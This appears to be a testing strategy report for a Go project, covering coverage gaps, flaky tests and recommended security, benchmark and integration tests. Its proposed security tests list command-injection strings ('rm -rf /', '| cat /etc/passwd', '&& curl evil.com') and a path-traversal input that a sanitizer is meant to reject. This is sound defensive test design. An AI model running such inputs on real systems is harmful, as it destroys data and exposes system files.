# Testing Strategy Report

## Coverage Summary

| Package                     | Coverage | Status           |
| --------------------------- | -------- | ---------------- |
| `internal/config`           | 100%     | Excellent        |
| `internal/parser`           | 100%     | Excellent        |
| `internal/domain`           | 86.1%    | Good             |
| `internal/git`              | 89.9%    | Good             |
| `internal/preflight`        | 88.1%    | Good             |
| `internal/workflow`         | 88.2%    | Good             |
| `internal/profile`          | 87.3%    | Good             |
| `internal/storage`          | 85.8%    | Good             |
| `internal/executor`         | 28.6%    | **Critical Gap** |
| `cmd/bmad`                  | 0.0%     | **No Tests**     |
| `internal/app`              | 0.0%     | **No Tests**     |
| `internal/api`              | 0.0%     | **No Tests**     |
| `internal/views/*` (9)      | 0.0%     | **No Tests**     |
| `internal/components/*` (4) | 0.0%     | **No Tests**     |

---

## 1. Test Quality Assessment

### Strengths

- Consistent use of `testify/assert` and `testify/require`
- Table-driven tests extensively used
- Good use of `t.TempDir()` for isolation
- In-memory SQLite for database tests
- Test helper package (`internal/testutil`)

### Good Patterns Observed

```go
// Table-driven tests in queue_test.go
tests := []struct {
    name          string
    existingKeys  []string
    addKey        string
    expectedCount int
}{...}

for _, tt := range tests {
    t.Run(tt.name, func(t *testing.T) {
        // Test implementation
    })
}
```

### Test Isolation

- Good: `t.TempDir()`, in-memory storage, `t.Cleanup()`
- Weak: Git tests depend on repository context

---

## 2. Critical Testing Gaps

### 2.1 Security Tests (MISSING)

**No security tests for command injection**

Location: `internal/executor/executor.go:278-317`

**Required Tests:**

```go
func TestBuildCommand_RejectsCommandInjection(t *testing.T) {
    maliciousKeys := []string{
        "3-1-test; rm -rf /",
        "3-1-test$(whoami)",
        "3-1-test`id`",
        "3-1-test | cat /etc/passwd",
        "3-1-test && curl evil.com",
        "3-1-test\"; echo pwned; \"",
    }
    for _, key := range maliciousKeys {
        t.Run(key, func(t *testing.T) {
            _, err := sanitizeStoryKey(key)
            assert.Error(t, err)
        })
    }
}
```

### 2.2 API Security Tests (MISSING)

**Required Tests:**

```go
func TestAPI_InputValidation(t *testing.T) {
    tests := []struct {
        name       string
        endpoint   string
        body       string
        wantStatus int
    }{
        {"empty_body", "/api/queue/add", "", 400},
        {"malformed_json", "/api/queue/add", "{invalid}", 400},
        {"oversized_body", "/api/queue/add", strings.Repeat("x", 1<<20), 413},
        {"injection_in_key", "/api/stories/../../../etc/passwd", "", 400},
    }
}

func TestAPI_RateLimiting(t *testing.T) {
    // Test request throttling
}
```

### 2.3 Performance Tests (MISSING)

**Required Benchmarks:**

```go
func BenchmarkListExecutions_Large(b *testing.B) {
    s, _ := storage.NewInMemoryStorage()
    // Seed with 10,000 executions
    for i := 0; i < 10000; i++ {
        // Add execution
    }

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        s.ListExecutions(context.Background(), &storage.ExecutionFilter{Limit: 100})
    }
}
```

### 2.4 Integration Tests (MISSING)

**Required Tests:**

```go
func TestExecutor_PersistsResults(t *testing.T) {
    // Setup: executor + storage
    // Execute: Run a story
    // Verify: Results saved to storage
}

func TestBatchExecutor_QueuePersistence(t *testing.T) {
    // Test queue state persistence
}
```

---

## 3. Flaky Test Risks

### Time-dependent Tests

```go
// executor_test.go - May flake on slow CI
select {
case <-done:
    // Success
case <-time.After(200 * time.Millisecond):
    t.Fatal("waitIfPaused blocked")
}
```

### Concurrency Tests

```go
// executor_test.go:310-339 - Race detection timing
func TestExecutor_Concurrency(t *testing.T) {
    // 100 iterations of pause/resume
}
```

### Environment-dependent Tests

```go
// git_test.go - Skipped outside git repo
if err := cmd.Run(); err != nil {
    t.Skip("Not running in a git repository")
}
```

---

## 4. Untested Lines of Code

| Package            | Lines | Risk                |
| ------------------ | ----- | ------------------- |
| `api/server.go`    | 682   | **HIGH** - Security |
| `api/websocket.go` | 300   | **HIGH** - Security |
| `views/stats`      | 549   | Medium              |
| `views/execution`  | 495   | Medium              |
| `views/history`    | 479   | Medium              |
| `views/queue`      | 469   | Medium              |

---

## 5. Recommended Test Cases

### Security Tests (Priority 1)

Create `internal/executor/executor_security_test.go`:

```go
func TestBuildCommand_InputSanitization(t *testing.T)
func TestBuildCommand_MaxLength(t *testing.T)
func TestBuildCommand_ValidKeys(t *testing.T)
```

Create `internal/api/server_security_test.go`:

```go
func TestAPI_InputValidation(t *testing.T)
func TestAPI_RateLimiting(t *testing.T)
func TestAPI_Authentication(t *testing.T)
func TestCORS_RestrictedOrigins(t *testing.T)
```

### Performance Tests (Priority 2)

Create `internal/storage/sqlite_benchmark_test.go`:

```go
func BenchmarkListExecutions_Small(b *testing.B)
func BenchmarkListExecutions_Large(b *testing.B)
func BenchmarkGetStats(b *testing.B)
func BenchmarkSaveExecution(b *testing.B)
```

### Integration Tests (Priority 2)

Create `internal/executor/integration_test.go`:

```go
func TestExecutor_PersistsResults(t *testing.T)
func TestBatchExecutor_QueueManagement(t *testing.T)
func TestParallelExecutor_ConcurrentExecution(t *testing.T)
```

---

## 6. Test Infrastructure Recommendations

### CI Pipeline

```yaml
test:
  script:
    - go test -race -coverprofile=coverage.out ./...
    - go tool cover -func=coverage.out
  coverage:
    minimum: 70% # For new code
```

### Additional Tools

1. **Race Detector:** `go test -race ./...`
2. **Security Scanner:** `gosec ./...`
3. **Fuzz Testing:** Add fuzz tests for input parsing
4. **Coverage Gates:** Require 80%+ for new code

---

## 7. Test Organization

### Current Structure (Good)

```
internal/
├── config/
│   └── config_test.go
├── domain/
│   ├── story_test.go
│   ├── queue_test.go
│   └── execution_test.go
├── executor/
│   ├── executor_test.go
│   ├── batch_test.go
│   └── parallel_test.go
└── testutil/
    └── testutil.go
```

### Recommended Additions

```
internal/
├── api/
│   ├── server_test.go          # NEW
│   ├── server_security_test.go # NEW
│   └── websocket_test.go       # NEW
├── executor/
│   ├── executor_security_test.go # NEW
│   └── integration_test.go       # NEW
└── storage/
    └── sqlite_benchmark_test.go  # NEW
```

---

## 8. Priority Action Plan

### Immediate (Security)

1. Add input validation to `buildCommand()`
2. Create security test suite for executor
3. Add API input validation tests

### Short-term (Coverage)

4. Increase executor coverage 28.6% → 70%+
5. Add API endpoint tests
6. Add WebSocket tests

### Medium-term (Quality)

7. Add performance benchmarks
8. Add integration tests
9. Consider snapshot tests for views

---

## 9. Mock Recommendations

Currently no mock framework used. Consider adding:

```go
// For external command execution
type CommandRunner interface {
    Run(ctx context.Context, name string, args ...string) ([]byte, error)
}

// For file system operations
type FileSystem interface {
    ReadFile(path string) ([]byte, error)
    WriteFile(path string, data []byte) error
}
```

This enables:

- Testing without actual Claude CLI
- Testing without file system
- Faster, isolated tests
